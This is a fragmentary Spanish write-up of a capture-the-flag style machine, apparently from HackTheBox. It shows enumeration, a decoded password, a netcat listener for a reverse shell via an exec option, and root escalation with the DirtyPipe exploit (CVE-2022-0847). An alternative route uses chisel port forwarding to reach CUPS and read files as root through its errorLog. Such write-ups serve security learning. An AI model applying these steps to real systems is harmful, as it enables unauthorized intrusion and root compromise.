...
Como solo hemos encontrado un puerto vamos a enumerar también los puertos de UDP por si alguno esta abierto.
...
Vemos que si enumeramos el string no obtenemos mucha información: 
...
Si buscamos en en `searchexploit` algun resultado tenemos uno interesante con el siguiente contenido 
...
Voy a intentar enumerarlo como pone en el poc pero con nuestra herramienta de enumeración:
...
Si lo decodificamos obtenemos una contraseña `P@ssw0rd@123!!123`
...
Al entrar nos encontramos una opción de poner una `?` y obtener más datos del sistema, al final hay una opción con `exec` para ejecutar comandos del sistema.
...
Estando en escucha por  otro puerto con `nc` previamente:

```shell
nc -lvnp 492
```

Vemos que conseguimos entablarnos una shell, por lo tanto vamos a realizar el tratamiento de la TTY para que tengamos una shell más cómoda.
...
Se puede realizar de varias maneras yo voy a usar `dirtyPipe` se puede acceder al recurso en el siguiente enlace:

```
https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
```

Esta vulnerabilidad se puede acontecer cuando podemos compilar con gcc , es capaz de inyectar y modificar el fichero `/etc/passwd` y crea un usuario o modificar root. Simplemente tenemos que copiar el exploit en un directorio temporal  y ejecutarlo.
...
## Forma alternativa
Comprobamos si encontramos algún puerto abierto intersante en la máquina que no encontrarmos anteriormente
...
Nos pasamos el fichero y nos ponemos como cliente en la máquina víctima haciendo el `portforwarding`

```shell
./chisel client 10.10.14.107:8000 R:631:127.0.0.1:631
```

De esta manera obtenemos una página web que muestra una página de administración de CUPS.

Si hacemos click en `View Error log`muestra el contenido de error.log.
Como CUPS esta funcionado como root por defecto podemos leer archivo utilizando `errorLog`de esta manera podemos usar el siguiente comando.
